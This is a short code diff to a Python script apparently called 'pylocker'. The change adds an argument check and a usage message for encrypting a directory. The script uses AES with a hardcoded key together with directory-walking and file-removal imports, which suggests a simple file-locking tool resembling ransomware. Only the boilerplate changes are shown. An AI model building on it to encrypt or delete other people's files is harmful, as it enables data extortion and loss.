@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 import shutil
 from sys import argv
+import sys
 from os import walk, remove
 from Crypto import Random
 from Crypto.Cipher import AES
@@ -73,6 +74,11 @@ def decrypt_file(file_name, key):
 def main():
 
 	key = b'sixteenbytekeyzz'
+
+	if len(sys.argv) != 2:
+		print("Error, \n\t Example ./pylocker dir_to_encrypt")
+		sys.exit()
+
 	mypath = argv[1]
 	encryption_flag = True
 
